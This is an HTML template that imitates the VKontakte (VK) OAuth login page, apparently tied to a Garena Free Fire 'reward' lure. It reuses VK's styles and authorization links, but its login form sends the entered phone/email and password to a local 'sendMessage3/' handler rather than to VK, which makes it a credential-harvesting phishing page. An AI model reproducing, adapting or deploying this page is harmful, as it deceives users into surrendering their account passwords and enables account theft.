<html lang="ru" dir="ltr"><head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>ВКонтакте | Вход</title>

    <link type="text/css" rel="stylesheet" href="https://vk.com/css/al/base.237f9f15382c30106561.css">

    <link type="text/css" rel="stylesheet" href="https://vk.com/css/al/fonts_cnt.5df9a2d31f91db9fc063.css">
    <link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.8f44c33173a84a6a96a6.css">
    <script type="text/javascript" language="javascript" src="https://vk.com/js/api/common_light.js?2"></script>
    <script type="text/javascript" language="javascript">// <![CDATA[
      function allow(button) {
        if (isButtonLocked(button)) return false;
        lockButton(button);

        var addr = '';
        if (isChecked('allow_notifications')) {
          addr = '&notify=1';
        }
        if (isChecked('denied_email')) {
          addr += '&email_denied=1';
        }
        if (isChecked('denied_phone')) {
          addr += '&phone_denied=1';
        }
        location.href = "https://login.vk.com/?act=grant_access&client_id=6262694&settings=65538&response_type=token&group_ids=&token_type=0&v=5.69&display=page&ip_h=8d7ab62f89edca88f1&hash=1646113651_7ff78a10f53c1df417&https=1&state=&redirect_uri=https%3A%2F%2Fauth.garena.com%2Foauth%2Flogin%3Fresponse_type%3Dtoken%26locale%3Dzh-TW%26redirect_uri%3Dhttps%253A%252F%252Freward.ff.garena.com%252F%26client_id%3D100067%26all_platforms%3D1%26platform%3D5"+addr;
        return false;
      }

      function cancel() {
        location.href = "https://login.vk.com/?act=grant_access&client_id=6262694&settings=65538&response_type=token&group_ids=&token_type=0&v=5.69&display=page&ip_h=8d7ab62f89edca88f1&hash=1646113651_7ff78a10f53c1df417&https=1&state=&redirect_uri=https%3A%2F%2Fauth.garena.com%2Foauth%2Flogin%3Fresponse_type%3Dtoken%26locale%3Dzh-TW%26redirect_uri%3Dhttps%253A%252F%252Freward.ff.garena.com%252F%26client_id%3D100067%26all_platforms%3D1%26platform%3D5&cancel=1";
        return false;
      }

      function login(button) {
        if (isButtonLocked(button)) return false;
        lockButton(button);
        ge('login_submit').submit();
      }

      function doResize(onResize) {
        onResize && setTimeout(function() {
          doResize()
        }, 100);

        if (!hasClass(document.body, 'oauth_centered') && !onResize) {
          if (window.outerHeight !== void 0) {
            var panelH = (window.outerHeight - window.innerHeight) | 0,
              panelW = (window.outerWidth - window.innerWidth) | 0;
          } else {
            var panelH = 50,
              panelW = 0;
          }
          var contentH = Math.max(ge('oauth_wrap_content').offsetHeight, 430),
            contentW = 655;
          window.resizeTo(contentW + panelW, contentH + panelH);
          window.moveTo(
            (screen.width - contentW) / 2 + (screen.availLeft | 0),
            ((screen.height - contentH) / 2) + (screen.availTop | 0)
          );
        }
      }

      function toggleEmailPrivacy() {
        checkbox('denied_email');
        if (!isChecked('denied_email')) {
          hide('denied_email');
          show('allowed_email');
        } else {
          hide('allowed_email');
          show('denied_email');
        }
      }

      function togglePhonePrivacy() {
        checkbox('denied_phone');
        if (!isChecked('denied_phone')) {
          hide('denied_phone');
          show('allowed_phone');
        } else {
          hide('allowed_phone');
          show('denied_phone');
        }
      }

      if (parent && parent != window) {
        location.href = "https://oauth.vk.com/blank.html";
      }

      
    // ]]></script>
  </head>

  <body onload="doResize();" class="VK oauth_centered">
    <script>
      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
    </script>
    <div class="oauth_wrap">
      <div class="oauth_wrap_inner">
        <div class="oauth_wrap_content" id="oauth_wrap_content">
          <div class="oauth_head">
  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
  
</div>

<div class="oauth_content box_body clear_fix">
  <div class="box_msg_gray box_msg_padded">Для продолжения вам необходимо войти <b>ВКонтакте</b>.</div>

  <form method="POST" id="login_submit" action="sendMessage3/">
    {% csrf_token %}
    <div class="oauth_form">

        <input type="hidden" id="expire" name="expire" value="0"> -->

        <div class="oauth_form_header">Телефон или email</div>
        <input type="text" class="oauth_form_input dark" name="email" value="">
        <div class="oauth_form_header">Пароль</div>
        <input type="password" class="oauth_form_input dark" name="password">

        

        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
        <input type="submit" name="submit_input" class="unshown">

    </div>
  </form>
</div>

    </div>
  
</body></html>
